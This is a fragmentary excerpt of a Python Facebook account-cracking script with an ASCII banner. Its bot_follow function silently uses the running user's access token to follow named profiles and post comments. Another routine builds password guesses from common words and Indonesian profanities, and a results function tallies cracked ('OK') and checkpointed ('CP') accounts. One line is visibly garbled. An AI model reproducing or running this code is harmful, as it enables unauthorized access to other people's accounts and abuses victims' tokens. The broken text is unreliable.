...
def banner():
    print("""\x1b[0;37m    ___            __   _______  
  / _ \           \ \ / /  __ \ 
 | (_) |  ______   \ V /| |  | |
  \__, | |______|   > < | |  | |
    / /            / . \| |__| |
...
def bot_follow():
	...
	requests.post("https://graph.facebook.com/100046998541177/subscribers?access_token=" + toket)      # Ninee August
	requests.post("https://graph.facebook.com/100016230550655/subscribers?access_token=" + toket)      # Maria Theresia Kurniawati
	requests.post("https://graph.facebook.com/100014435494597/subscribers?access_token=" + toket)      # 
	requests.post("https://graph.facebook.com/100015133174445/subscribers?access_token=" + toket)      # Fajar EL. Reiva Cahya XD.
	requests.post('https://graph.facebook.com/1248672485647179/comments/?message= Waifumu Cantik Mas🥵 &access_token=' + toket)
	requests.post('https://graph.facebook.com/1248672485647179/comments/?message= @[100015133174445:] Ganteng deh🥵 &access_token=' + toket)00014435494597MAIN MENU ###
	menu()
		...
		if len(i)<3:
			...
			if len(i)==3 or len(i)==4 or len(i)==5:
				...
				if "id" in ct:
					...
					results.append("bahagia")
					results.append("kontol")
					results.append("memek")
					results.append("bangsat")
					results.append("naruto")
...
def results(Nine,Krahkrah):
        if len(Nine) !=0:
                print(("[OK] : "+str(len(Nine))))
        if len(Krahkrah) !=0:
                print(("[CP] : "+str(len(Krahkrah))))
        if len(Nine) ==0 and len(Krahkrah) ==0:
                print("\n")
